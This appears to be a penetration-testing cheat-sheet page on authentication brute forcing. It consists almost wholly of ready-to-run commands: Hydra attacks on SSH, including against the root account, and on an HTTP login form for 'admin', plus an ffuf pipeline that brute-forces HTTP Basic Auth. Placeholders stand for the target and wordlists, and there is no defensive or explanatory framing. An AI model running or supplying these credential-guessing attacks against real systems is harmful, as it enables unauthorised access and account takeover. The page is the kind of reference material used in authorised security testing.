# Authentification bruteforce

## Hydra <a href="#bruteforce" id="bruteforce"></a>

```bash
# List of users using wordlists
hydra -L users.txt -P <passwordList> -t 3 -s port <IP> ssh

# Only one user and wordlist passwords
hydra -l root -P <passwordList> -t 3 -s port <IP> ssh

# HTTP
hydra -l admin -P <passwordList> target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"

# BASE64 - BASIC AUTH
https://github.com/ffuf/ffuf-scripts
./ffuf-scripts/ffuf_basicauth.sh usernames.txt passwords.txt | ffuf -w -:AUTHFUZZ -request brute.req.txt -request-proto http
echo AUTHFUZZ | base64 --decode
```

